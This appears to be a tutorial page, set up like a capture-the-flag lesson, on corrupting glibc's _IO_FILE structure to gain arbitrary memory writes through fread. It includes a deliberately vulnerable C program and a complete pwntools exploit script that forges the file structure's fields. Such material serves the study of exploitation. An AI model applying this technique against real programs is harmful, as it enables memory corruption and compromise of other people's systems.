#metadata(
  (
    title: "Arbitrary Write",
    description: "Corrupting the _IO_FILE structure to write data to arbitrary memory addresses.",
    date: "2026-01-02",
    order: 4,
    draft: false,
  ),
)<frontmatter>
#import "../../../../typst-theme.c.typ": project
#show: project

= Arbitrary Write via FILE Structure Corruption

Similar to how `fwrite` can be abused for arbitrary reads, the `fread` function (and other input operations) can be manipulated to perform arbitrary memory writes. By redirecting the internal stream buffers to a target address, we can force the library to "fill" our chosen memory location with data from a file descriptor we control (like `stdin`).

== Vulnerable Scenario

In this scenario, a program allows an overflow into a `FILE` structure before calling `fread`. The goal is to overwrite the `authenticated` global variable to trigger the `win` function.

```c
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

FILE *fp;
char *buf;
int authenticated;

void win() { puts("Well done baby"); }

int main(int argc, char **argv, char **envp) {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);

  authenticated = 0;
  buf = malloc(0x100);

  // Open a dummy file
  fp = fopen("/tmp/uiiaiiuuiiai.txt", "r");
  if (!fp) {
    perror("fopen");
    exit(1);
  }

  printf("authenticated is at %p\n", &authenticated);

  // The vulnerability: 0x1e0 bytes overflow into the FILE structure
  read(0, fp, 0x1e0);

  // This call will now use our corrupted structure
  fread(buf, 1, 0x100, fp);

  if (authenticated) {
    win();
  } else {
    puts("You are not 1337 enough.");
  }

  return 0;
}
```

== Glibc Internals: `_IO_file_xsgetn`

When `fread` is called, it eventually invokes `_IO_file_xsgetn`. This function manages the transfer of data from the stream's buffer to the user's buffer. If the stream buffer is empty, it calls `__underflow` to refill it.

```c
// Simplified glibc/libio/fileops.c
size_t _IO_file_xsgetn (FILE *fp, void *data, size_t n)
{
  size_t want, have;
  want = n;

  while (want > 0)
    {
      have = fp->_IO_read_end - fp->_IO_read_ptr;
      if (want <= have)
	{
	  memcpy (data, fp->_IO_read_ptr, want);
	  fp->_IO_read_ptr += want;
	  want = 0;
	}
      else
	{
	  /* ... (buffer management) ... */

	  // If buffer is empty, trigger underflow
	  if (fp->_IO_buf_base && want < (size_t) (fp->_IO_buf_end - fp->_IO_buf_base))
	    {
	      if (__underflow (fp) == EOF)
		break;
	      continue;
	    }

	  /* ... (direct SYSREAD path) ... */
	}
    }
  return n - want;
}
```

The `__underflow` call eventually leads to `_IO_new_file_underflow`, which performs the actual `read` system call into `_IO_buf_base`.

== Exploitation Strategy

To perform an arbitrary write to the `authenticated` variable, we must satisfy these conditions:

1. *`_flags`*: Clear `_IO_NO_READS` (`0x0004`) to allow input operations.
2. *`_fileno`*: Set to `0` (stdin) to read input from the user instead of the file.
3. *`_IO_read_ptr` & `_IO_read_end`*: Set them equal to each other (e.g., both `0`) to convince Glibc that the internal buffer is empty and needs refilling.
4. *`_IO_buf_base`*: Point to the target address (`&authenticated`).
5. *`_IO_buf_end`*: Point to the end of the target area (`&authenticated + size`). The difference `_IO_buf_end - _IO_buf_base` must be *strictly larger* than the `fread` size (`want`) to satisfy the internal check: `want < (size_t) (fp->_IO_buf_end - fp->_IO_buf_base)`.

When `__underflow` is triggered, Glibc will call `read(0, _IO_buf_base, _IO_buf_end - _IO_buf_base)`, effectively writing our input directly to the target memory.

== Exploit Script

```python
from pwn import *

elf = context.binary = ELF("./challenge")
p = process(elf.path)

p.recvuntil(b"authenticated is at ")
auth_addr = int(p.recvline().strip(), 16)
info(f"Target address: {hex(auth_addr)}")

# Crafting the fake FILE structure for arbitrary write
payload = flat({
    0x00: p64(0xfbad0000 & ~4),   # _flags: MAGIC, clear NO_READS
    0x08: p64(0),                 # _IO_read_ptr
    0x10: p64(0),                 # _IO_read_end
    0x38: p64(auth_addr),         # _IO_buf_base (Target)
    0x40: p64(auth_addr + 0x101), # _IO_buf_end
    0x70: p32(0),                 # _fileno (stdin)
}, filler=b"\x00")

# Send the corrupted FILE structure
p.send(payload)

# Now fread will call underflow and read from stdin into auth_addr
# We send a non-zero value to make 'authenticated' true
# Make sure to send enough data to fill the target area (0x100++ bytes)
p.send(b"a" * 0x100)

p.interactive()
```

